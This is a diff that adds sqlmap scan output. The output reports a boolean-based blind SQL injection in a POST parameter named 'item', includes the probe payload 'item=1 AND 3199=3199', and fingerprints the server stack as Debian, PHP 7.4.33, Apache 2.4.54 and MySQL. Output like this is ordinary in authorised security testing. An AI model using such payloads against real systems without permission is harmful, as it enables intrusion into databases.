@@ -1,0 +1,10 @@
+sqlmap identified the following injection point(s) with a total of 12 HTTP(s) requests:
+---
+Parameter: item (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: item=1 AND 3199=3199
+---
+web server operating system: Linux Debian
+web application technology: PHP 7.4.33, PHP, Apache 2.4.54
+back-end DBMS: MySQL >= 5.0.0
